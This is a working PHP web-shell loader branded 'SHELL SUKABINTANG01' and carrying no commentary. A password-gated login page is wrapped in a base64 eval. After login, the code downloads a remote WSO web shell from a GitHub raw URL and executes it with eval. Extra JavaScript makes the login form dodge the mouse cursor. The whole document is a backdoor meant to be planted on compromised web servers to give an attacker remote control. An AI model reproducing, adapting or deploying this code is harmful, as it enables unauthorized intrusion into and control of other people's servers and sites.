<?php
$code = '<?php
session_start();

// Function to get content from a URL
function geturlsinfo($url) {
    if (function_exists("curl_exec")) {
        $conn = curl_init($url);
        curl_setopt($conn, CURLOPT_RETURNTRANSFER, 1);
        curl_setopt($conn, CURLOPT_FOLLOWLOCATION, 1);
        curl_setopt($conn, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
        curl_setopt($conn, CURLOPT_SSL_VERIFYPEER, 0);
        curl_setopt($conn, CURLOPT_SSL_VERIFYHOST, 0);
        if (isset($_SESSION["coki"])) {
            curl_setopt($conn, CURLOPT_COOKIE, $_SESSION["coki"]);
        }
        $url_get_contents_data = curl_exec($conn);
        curl_close($conn);
    } elseif (function_exists("file_get_contents")) {
        $url_get_contents_data = file_get_contents($url);
    } elseif (function_exists("fopen") && function_exists("stream_get_contents")) {
        $handle = fopen($url, "r");
        $url_get_contents_data = stream_get_contents($handle);
        fclose($handle);
    } else {
        $url_get_contents_data = false;
    }
    return $url_get_contents_data;
}

// Function to check if the user is logged in
function is_logged_in() {
    return isset($_SESSION["logged_in"]) && $_SESSION["logged_in"] === true;
}

// Check if the password is submitted and correct
if (isset($_POST["password"])) {
    $entered_password = $_POST["password"];
    $hashed_password = "1ac1bddadcb7dea96ed231e661eba215";
    if (md5($entered_password) === $hashed_password) {
        $_SESSION["logged_in"] = true;
        $_SESSION["SukaBintang01"] = "SukaBintang01";
    } else {
        echo "Incorrect password. Please try again.";
    }
}

// Check if the user is logged in before executing the content
if (is_logged_in()) {
    $a = geturlsinfo("https://raw.githubusercontent.com/Tituss22/ShellSukaBintang01/refs/heads/main/wso.php");
    eval("?>" . $a);
} else {
    ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SHELL SUKABINTANG01</title>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #1a1f2b;
            overflow: hidden; 
        }

        form {
            display: flex;
            flex-direction: column;
            align-items: center;
            padding: 20px;
            border: 1px solid #ddd;
            border-radius: 8px;
            background-color: #426e8a;
            box-shadow: 0px 4px 8px rgba(0, 0, 0, 0.1);
            position: absolute;
            transition: transform 0.2s ease;
        }

        label, input[type="password"], input[type="submit"] {
            margin: 8px 0;
        }

        input[type="password"], input[type="submit"] {
            padding: 10px;
            font-size: 1em;
            border: 1px solid #ccc;
            border-radius: 4px;
            width: 100%;
            max-width: 250px;
        }

        input[type="submit"] {
            background-color: #007bff;
            color: white;
            cursor: pointer;
            transition: background-color 0.3s;
        }

        input[type="submit"]:hover {
            background-color: #651c75;
        }
    </style>
</head>
<body>

    <form id="login-form" method="POST" action="">
        <label for="password">GARUDA SECURITY:</label>
        <input type="password" id="password" name="password">
        <input type="submit" value="LOGIN">
    </form>



</body>
</html>



    <?php
}
?>';

// Base64 encode the PHP code
$encoded_code = base64_encode($code);

// Execute the encoded code
eval('?>' . base64_decode($encoded_code));
?>


<script>
        const form = document.getElementById('login-form');

        // Detect mouse movement
        document.addEventListener('mousemove', (event) => {
            const mouseX = event.clientX;
            const mouseY = event.clientY;
            
            const formRect = form.getBoundingClientRect();
            const formX = formRect.left + formRect.width / 2;
            const formY = formRect.top + formRect.height / 2;

            const distance = Math.hypot(mouseX - formX, mouseY - formY);

            // Move form if mouse is within 150px distance
            if (distance < 150) {
                const offsetX = (Math.random() * 300) - 150; // Random movement within a range
                const offsetY = (Math.random() * 300) - 150;
                
                const newX = Math.min(window.innerWidth - formRect.width, Math.max(0, formRect.left + offsetX));
                const newY = Math.min(window.innerHeight - formRect.height, Math.max(0, formRect.top + offsetY));

                form.style.transform = `translate(${newX}px, ${newY}px)`;
            }
        });
    </script>